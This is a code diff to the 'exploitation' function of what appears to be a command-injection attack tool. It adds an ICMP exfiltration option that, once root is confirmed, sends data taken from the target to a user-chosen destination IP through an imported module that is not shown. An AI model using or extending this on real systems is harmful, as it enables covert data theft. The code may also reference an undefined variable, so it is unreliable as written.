@@ -15,6 +15,7 @@
 """
 
 import re
+import os
 import sys
 import time
 import string
@@ -391,11 +392,39 @@ def exploitation(url,delay,filename,http_request_method):
   if no_result == True:
     if menu.options.verbose == False:
       print "[" + colors.RED + " FAILED "+colors.RESET+"]"
-      return False
   
     else:
       print ""
-      return False
+    
+    # Use the ICMP Exfiltration technique
+    if menu.options.ip_icmp_data:
+      
+      # You need to have root privileges to run this script
+      if os.geteuid() != 0:
+	print colors.RED + "\n(x) Error:  You need to have root privileges to run this option.\n" + colors.RESET
+	sys.exit(0)
+	
+      if http_request_method == "GET":
+	request_data = url
+      else:
+	request_data = parameter
+	
+      ip_data = menu.options.ip_icmp_data
+      
+      # Load the module
+      from src.core.modules import ICMP_Exfiltration
+      technique = "ICMP exfiltration technique"
+      sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... \n" + colors.RESET)
+      sys.stdout.flush()
+      
+      ip_src =  re.findall(r"ip_src=(.*),", ip_data)
+      ip_src = ''.join(ip_src)
+      
+      ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
+      ip_dst = ''.join(ip_dst)
+      
+      ICMP_Exfiltration.exploitation(ip_dst,ip_src,url,http_request_method,request_data)
+    return False
   
   else :
     print ""
